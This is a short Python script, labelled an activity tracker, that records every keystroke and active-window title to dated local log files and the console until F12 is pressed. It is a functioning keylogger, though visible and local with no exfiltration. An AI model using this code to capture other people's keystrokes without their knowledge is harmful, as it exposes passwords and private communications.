from pynput import keyboard
from time import gmtime, strftime
import pygetwindow as gw
import os

class ActivityTracker:
    def __init__(self):
        self.last_window= None

    def __save_to_file(self, data):
        os.makedirs("logs", exist_ok= True)
        try:
            with open(f'logs/{strftime("%Y-%m-%d", gmtime())}.txt', "a", encoding= "utf-8") as file:
                file.write(f'[{strftime("%Y-%m-%d %H:%M", gmtime())}] {data} \n')
        except Exception as e:
            print(f"An error occured: {e}")

    def on_press(self, key):
        active_window= gw.getActiveWindowTitle()
        if active_window != self.last_window:
            self.__save_to_file(f"Switched to: {active_window}")
            print(f"Switched to: {active_window}")
            self.last_window= active_window

        print(f"Typed: {key}")
        self.__save_to_file(f"Typed: {key}")
        if str(key) == "Key.f12":
            return False


tracker= ActivityTracker()
with keyboard.Listener(
    on_press= tracker.on_press
) as listener:
    listener.join()